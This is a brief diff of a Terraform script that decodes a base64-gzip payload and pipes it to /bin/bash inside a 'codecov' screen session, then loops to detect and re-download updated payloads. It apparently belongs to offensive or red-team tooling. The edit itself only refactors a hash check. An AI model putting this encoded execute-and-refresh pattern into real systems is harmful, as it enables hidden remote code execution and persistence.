@@ -39,8 +39,7 @@ locals {
         screen -S codecov -p 0 -X stuff "echo '${base64gzip(local.base64_command_payload)}' | base64 -d | gunzip | /bin/bash -^M"
         log 'waiting 30 minutes...';
         sleep 1800
-        CHECK_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
-        if [ "$CHECK_HASH" != "$START_HASH" ]; then
+        if ! check_payload_update /tmp/payload_$SCRIPTNAME $START_HASH; then
             log "payload update detected - exiting loop and forcing payload download"
             rm -f /tmp/payload_$SCRIPTNAME
             break
